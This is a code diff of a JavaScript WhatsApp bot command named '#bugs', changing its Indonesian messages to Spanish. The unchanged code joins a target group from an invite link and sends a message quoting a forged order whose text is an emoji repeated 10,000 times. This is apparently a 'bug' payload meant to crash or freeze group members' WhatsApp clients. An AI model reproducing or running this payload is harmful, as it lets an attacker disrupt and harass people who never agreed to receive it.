@@ -2,14 +2,14 @@ let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
 
 let handler = async (m, { conn, text }) => {
     let [_, code] = text.match(linkRegex) || []
-    if (!code) throw 'Link invalid\nContoh Penggunaan #bugs https://chat.whatsapp.com/linkgrouptargetnya'
+    if (!code) throw 'Link invalido\nEjemplo de uso #bugs https://chat.whatsapp.com/enlace de grupo'
     let { gid: target } = await conn.acceptInvite(code)
     let member = (await conn.groupMetadata(target)).participants.map(v => v.jid)
 await conn.relayWAMessage(global.mm=conn.
 prepareMessageFromContent(target, conn.
 prepareDisappearingMessageSettingContent(0),
 {}),{waitForAck:!0})
-await conn.sendMessage(target, 'Hai Kak', 'conversation', {
+await conn.sendMessage(target, 'Hola hermano', 'conversation', {
  quoted: {
   key: {
   remoteJid: 'status@broadcast',
@@ -21,7 +21,7 @@ await conn.sendMessage(target, 'Hai Kak', 'conversation', {
     status: 1,
     surface: 1,
     message: '🔥'.repeat(10000),
-    orderTitle: 'HAI KAKK', // Idk what this does
+    orderTitle: 'HOLA HERMANO', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
